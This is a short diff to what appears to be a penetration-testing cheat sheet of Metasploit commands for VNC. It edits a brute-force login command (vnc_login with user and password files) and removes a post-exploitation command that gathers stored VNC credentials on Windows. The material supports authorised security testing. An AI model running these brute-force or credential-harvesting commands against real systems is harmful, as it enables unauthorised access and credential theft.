@@ -40,11 +40,5 @@ msfconsole -x "use auxiliary/scanner/vnc/vnc_login; set RHOSTS <ip>; set RPORT <
 ## vnc - msf test login bf (2)
 #cat/ATTACK/BRUTEFORCE-SPRAY 
 ```
-msfconsole -x "use auxiliary/scanner/vnc/vnc_login; set RHOSTS <ip>; set RPORT <port>; set USER_FILE <users_file>; set PASS_FILE <pass_file>; run"
-```
-
-## vnc - post exploit retrieve credentials
-#cat/POSTEXPLOIT/CREDS_RECOVER 
-```
-msfconsole -x "use post/windows/gather/credentials/vnc; set SESSION <session>; run"
+msfconsole -x "use auxiliary/scanner/vnc/vnc_login; set RHOSTS <rhost>; set RPORT <rport>; set USER_FILE <users.txt>; set PASS_FILE <passwords.txt>; run"
 ```
